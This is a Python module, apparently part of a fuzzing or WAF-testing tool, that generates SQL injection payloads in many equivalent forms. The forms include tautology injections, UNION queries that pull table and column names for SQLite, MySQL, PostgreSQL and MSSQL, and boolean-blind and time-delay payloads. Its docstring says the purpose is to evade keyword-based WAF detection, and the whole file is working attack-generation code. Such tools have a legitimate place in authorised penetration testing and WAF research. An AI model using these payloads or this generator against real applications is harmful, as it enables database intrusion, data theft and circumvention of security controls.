"""Semantic preservation engine — generate SQL-equivalent payloads.

Unlike string mutation (change bytes, hope), this engine UNDERSTANDS SQL
semantics and generates provably-equivalent forms.  `OR 1=1` means "make
the WHERE condition always true" — there are 50+ ways to express that.

Each generated variant is a different surface form of the SAME logical
operation, maximising the chance one evades keyword-based WAF detection.
"""
from __future__ import annotations

import itertools
import random
import re
from dataclasses import dataclass, field
from typing import Sequence

from .base import REGISTRY

_SQL = {"SQL Injection", "NoSQL Injection"}

# ---------------------------------------------------------------------------
# Equivalence tables
# ---------------------------------------------------------------------------

TAUTOLOGIES: list[str] = [
    "1=1", "2>1", "3!=4", "1<>0", "1<2",
    "'a'='a'", "'b'<>'c'",
    "1 LIKE 1", "1 BETWEEN 0 AND 2", "1 IN (1)",
    "NOT 1=2", "NOT 0", "1 IS NOT NULL",
    "'a' GLOB '*'", "1 GLOB '1'",
    "1 COLLATE NOCASE = 1",
    "IIF(1,1,0)=1", "CASE WHEN 1 THEN 1 END=1",
    "TYPEOF(1)='integer'", "TYPEOF('a')='text'",
    "NULLIF(1,2) IS NOT NULL", "COALESCE(1,0)=1",
    "LENGTH('a')=1", "LENGTH('')=0",
    "ABS(1)=1", "ABS(-1)=1",
    "UNICODE('a')=97",
    "HEX(1)='31'", "QUOTE(1)='1'",
    "INSTR('abc','a')>0",
    "REPLACE('a','x','y')='a'",
    "SUBSTR('ab',1,1)='a'",
    "0x1=0x1", "1e0=1e0", "1.0=1.0",
    "(2-1)=1", "(1+0)=1", "(1*1)=1",
    "EXISTS(SELECT 1)",
]

OR_EQUIVALENTS: list[str] = [
    "OR", "or", "Or", "oR", "||",
]

AND_EQUIVALENTS: list[str] = [
    "AND", "and", "And", "&&",
]

COMMENT_EQUIVALENTS: list[str] = [
    "--", "-- -", "#", "/**/", ";%00", "",
]

QUOTE_STYLES: list[str] = [
    "'", '"', "')", "'))", "')) ",
]

WHITESPACE_VARIANTS: list[str] = [
    " ", "\t", "\n", "/**/", "/*a*/",
]

# ---------------------------------------------------------------------------
# Atomic equivalence generators
# ---------------------------------------------------------------------------

def string_equivalents(s: str) -> list[str]:
    """Generate equivalent representations of a string value."""
    results = [f"'{s}'"]
    chars = ",".join(str(ord(c)) for c in s)
    if chars:
        results.append(f"CHAR({chars})")
    hex_val = s.encode("utf-8", errors="replace").hex()
    results.append(f"X'{hex_val}'")
    if len(s) > 1:
        mid = len(s) // 2
        results.append(f"'{s[:mid]}'||'{s[mid:]}'")
    results.append(f"REPLACE('{s}x','x','')")
    return results


def number_equivalents(n: int) -> list[str]:
    """Generate equivalent representations of a number."""
    results = [str(n)]
    if 0 <= n <= 0xFFFF:
        results.append(f"0x{n:x}")
    results.append(f"{float(n)}")
    results.append(f"{n}e0")
    if n > 0:
        results.append(f"({n + 1}-1)")
        results.append(f"ABS({n})")
    if n == 1:
        results.extend(["(2-1)", "(1*1)", "(1+0)", "COALESCE(1,0)"])
    if n == 0:
        results.extend(["(1-1)", "(0*1)", "COALESCE(NULL,0)"])
    return results


def column_count_nulls(n: int) -> list[list[str]]:
    """Generate UNION column-fill variants (NULL vs number vs string)."""
    base = ["NULL"] * n
    variants = [list(base)]
    for i in range(n):
        v = list(base)
        v[i] = str(i + 1)
        variants.append(v)
    return variants


# ---------------------------------------------------------------------------
# Semantic engine
# ---------------------------------------------------------------------------

@dataclass
class SemanticEngine:
    """Generate semantically equivalent SQL injection payloads."""

    dbms: str = "generic"
    max_variants: int = 50

    # -- tautology injections -----------------------------------------------

    def generate_tautology_injections(
        self,
        quote: str = "'",
        or_kws: Sequence[str] | None = None,
        comments: Sequence[str] | None = None,
        tautologies: Sequence[str] | None = None,
    ) -> list[str]:
        """Combinatorial tautology injection: quote × OR × taut × comment."""
        ors = list(or_kws or OR_EQUIVALENTS)
        comms = list(comments or COMMENT_EQUIVALENTS)
        tauts = list(tautologies or TAUTOLOGIES)
        results: list[str] = []
        for taut in tauts:
            for or_kw in ors:
                for comm in comms:
                    results.append(f"{quote} {or_kw} {taut}{comm}")
        return self._dedupe(results)

    # -- UNION injections ---------------------------------------------------

    def generate_union_injections(
        self,
        columns: int = 3,
        quote: str = "'",
        comments: Sequence[str] | None = None,
    ) -> list[str]:
        """UNION-based extraction payloads with column-fill variants."""
        comms = list(comments or COMMENT_EQUIVALENTS[:3])
        results: list[str] = []
        col_variants = column_count_nulls(columns)
        for cols in col_variants:
            select_list = ",".join(cols)
            for comm in comms:
                results.append(f"{quote} UNION SELECT {select_list}{comm}")
                results.append(f"{quote} UNION ALL SELECT {select_list}{comm}")
        # schema extraction variants
        schema_queries = self._schema_queries()
        for sq in schema_queries:
            for cols in col_variants[:2]:
                fill = list(cols)
                fill[0] = f"({sq})"
                select_list = ",".join(fill)
                results.append(f"{quote} UNION SELECT {select_list}--")
        return self._dedupe(results)

    def _schema_queries(self) -> list[str]:
        if self.dbms == "sqlite":
            return [
                "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1",
                "SELECT sql FROM sqlite_master LIMIT 1",
            ]
        if self.dbms == "mysql":
            return [
                "SELECT table_name FROM information_schema.tables LIMIT 1",
                "SELECT column_name FROM information_schema.columns LIMIT 1",
            ]
        if self.dbms in ("postgresql", "pg"):
            return [
                "SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1",
                "SELECT column_name FROM information_schema.columns LIMIT 1",
            ]
        if self.dbms == "mssql":
            return [
                "SELECT TOP 1 name FROM sysobjects WHERE xtype='U'",
                "SELECT TOP 1 name FROM syscolumns",
            ]
        return [
            "SELECT 1",
            "SELECT table_name FROM information_schema.tables LIMIT 1",
        ]

    # -- blind injections ---------------------------------------------------

    def generate_blind_injections(
        self,
        target_expr: str = "SELECT version()",
        quote: str = "'",
    ) -> list[str]:
        """Boolean-blind extraction payloads with equivalent conditions."""
        results: list[str] = []
        pos_markers = ["1", "2", "3"]
        char_tests = [
            "SUBSTR(({expr}),{pos},1)>'{c}'",
            "SUBSTR(({expr}),{pos},1)<'{c}'",
            "SUBSTR(({expr}),{pos},1)='{c}'",
            "UNICODE(SUBSTR(({expr}),{pos},1))>{o}",
        ]
        for pos in pos_markers:
            for tpl in char_tests:
                payload = tpl.format(expr=target_expr, pos=pos, c="M", o="77")
                results.append(f"{quote} AND {payload}--")
                results.append(f"{quote} OR {payload}--")
        # length check
        results.append(f"{quote} AND LENGTH(({target_expr}))>0--")
        results.append(f"{quote} AND LENGTH(({target_expr}))>10--")
        return self._dedupe(results)

    # -- time-blind injections ----------------------------------------------

    def generate_time_injections(self, quote: str = "'") -> list[str]:
        """Time-based blind payloads per DBMS."""
        results: list[str] = []
        delays = {
            "sqlite": ["randomblob(100000000)", "LIKE('ABCDEFG',UPPER(HEX(randomblob(100000000))))"],
            "mysql": ["SLEEP(5)", "BENCHMARK(5000000,SHA1('a'))"],
            "postgresql": ["pg_sleep(5)", "(SELECT pg_sleep(5))"],
            "mssql": ["WAITFOR DELAY '0:0:5'"],
            "generic": ["SLEEP(5)", "BENCHMARK(5000000,SHA1('a'))", "pg_sleep(5)"],
        }
        for d in delays.get(self.dbms, delays["generic"]):
            results.append(f"{quote} AND {d}--")
            results.append(f"{quote} OR {d}--")
            results.append(f"{quote}; SELECT {d}--")
        return self._dedupe(results)

    # -- semantic expand (any payload) --------------------------------------

    def semantic_expand(self, payload: str) -> list[str]:
        """Take any SQLi payload and generate semantically equivalent forms.

        Tokenises the payload with the SQL-AST tokeniser, identifies
        substitutable components (numbers, operators, keywords, comments),
        and replaces each with its equivalence class.
        """
        variants: list[str] = [payload]

        # Tautology substitution: replace 1=1 patterns
        taut_re = re.compile(r"(\d+)\s*=\s*(\d+)")
        m = taut_re.search(payload)
        if m and m.group(1) == m.group(2):
            for taut in TAUTOLOGIES[:20]:
                variants.append(payload[:m.start()] + taut + payload[m.end():])

        # OR/AND keyword substitution
        or_re = re.compile(r"\bOR\b", re.IGNORECASE)
        if or_re.search(payload):
            for eq in OR_EQUIVALENTS:
                variants.append(or_re.sub(eq, payload, count=1))

        and_re = re.compile(r"\bAND\b", re.IGNORECASE)
        if and_re.search(payload):
            for eq in AND_EQUIVALENTS:
                variants.append(and_re.sub(eq, payload, count=1))

        # Comment substitution
        comm_re = re.compile(r"--\s*$|--\s*-\s*$|#\s*$|/\*.*?\*/\s*$")
        cm = comm_re.search(payload)
        if cm:
            prefix = payload[:cm.start()]
            for comm in COMMENT_EQUIVALENTS:
                variants.append(prefix + comm)

        # Quote style substitution
        if payload and payload[0] in ("'", '"'):
            q = payload[0]
            rest = payload[1:]
            for qs in QUOTE_STYLES:
                if qs != q:
                    variants.append(qs + rest)

        # Whitespace variation
        ws_re = re.compile(r"(?<=['\"])\s+(?=\S)")
        for ws in WHITESPACE_VARIANTS:
            variants.append(ws_re.sub(ws, payload, count=1))

        # Number substitution
        num_re = re.compile(r"\b(\d+)\b")
        for nm in num_re.finditer(payload):
            n = int(nm.group(1))
            if 0 <= n <= 10:
                for eq in number_equivalents(n)[:4]:
                    if eq != nm.group(0):
                        variants.append(
                            payload[:nm.start()] + eq + payload[nm.end():]
                        )

        return self._dedupe(variants)[:self.max_variants]

    # -- semantic reduce (simplify) -----------------------------------------

    def semantic_reduce(self, payload: str) -> str:
        """Reduce a payload to its simplest semantic form."""
        result = payload.strip()
        # Normalise whitespace
        result = re.sub(r"\s+", " ", result)
        # Simplify tautologies to canonical form
        for taut in TAUTOLOGIES[1:]:
            result = result.replace(taut, "1=1")
        # Normalise comment
        result = re.sub(r"--\s*-?\s*$", "--", result)
        result = re.sub(r"#\s*$", "--", result)
        result = re.sub(r"/\*.*?\*/\s*$", "--", result)
        # Normalise OR
        result = re.sub(r"\b(or|oR|Or)\b", "OR", result, flags=re.IGNORECASE)
        return result

    # -- helpers ------------------------------------------------------------

    def _dedupe(self, items: list[str]) -> list[str]:
        seen: set[str] = set()
        out: list[str] = []
        for item in items:
            if item not in seen:
                seen.add(item)
                out.append(item)
        return out


# ---------------------------------------------------------------------------
# Convenience: generate ALL forms for a given attack template
# ---------------------------------------------------------------------------

def semantic_all(payload: str, dbms: str = "generic",
                 max_variants: int = 50) -> list[str]:
    """One-shot: expand a payload into all semantic equivalents."""
    engine = SemanticEngine(dbms=dbms, max_variants=max_variants)
    base = engine.semantic_expand(payload)
    if re.search(r"(?i)\bOR\b.*\b\d+=\d+", payload):
        base.extend(engine.generate_tautology_injections()[:max_variants // 3])
    return engine._dedupe(base)[:max_variants]


# ---------------------------------------------------------------------------
# Register as multi-variant mutators
# ---------------------------------------------------------------------------

def _tautology_multi(payload: str) -> list[str]:
    engine = SemanticEngine()
    return engine.generate_tautology_injections()[:20]

def _expand_multi(payload: str) -> list[str]:
    return SemanticEngine().semantic_expand(payload)[:20]

def _union_multi(payload: str) -> list[str]:
    return SemanticEngine().generate_union_injections()[:15]

def _blind_multi(payload: str) -> list[str]:
    return SemanticEngine().generate_blind_injections()[:15]

def _time_multi(payload: str) -> list[str]:
    return SemanticEngine().generate_time_injections()[:10]

# Single-variant wrappers (first variant)
def _tautology_single(p: str) -> str:
    v = _tautology_multi(p)
    return v[0] if v else p

def _expand_single(p: str) -> str:
    v = _expand_multi(p)
    return v[1] if len(v) > 1 else p

def _union_single(p: str) -> str:
    v = _union_multi(p)
    return v[0] if v else p

def _blind_single(p: str) -> str:
    v = _blind_multi(p)
    return v[0] if v else p

def _time_single(p: str) -> str:
    v = _time_multi(p)
    return v[0] if v else p

REGISTRY.add("semantic_tautology", _tautology_single, "semantic",
             desc="Generate tautology injection variants (50+ forms of OR 1=1)",
             classes=_SQL, multi=True, multi_fn=_tautology_multi)

REGISTRY.add("semantic_expand", _expand_single, "semantic",
             desc="Expand any payload into semantically equivalent forms",
             classes=_SQL, multi=True, multi_fn=_expand_multi)

REGISTRY.add("semantic_union", _union_single, "semantic",
             desc="Generate UNION injection variants with column-fill alternatives",
             classes=_SQL, multi=True, multi_fn=_union_multi)

REGISTRY.add("semantic_blind", _blind_single, "semantic",
             desc="Generate boolean-blind extraction variants",
             classes=_SQL, multi=True, multi_fn=_blind_multi)

REGISTRY.add("semantic_time", _time_single, "semantic",
             desc="Generate time-based blind variants per DBMS",
             classes=_SQL, multi=True, multi_fn=_time_multi)
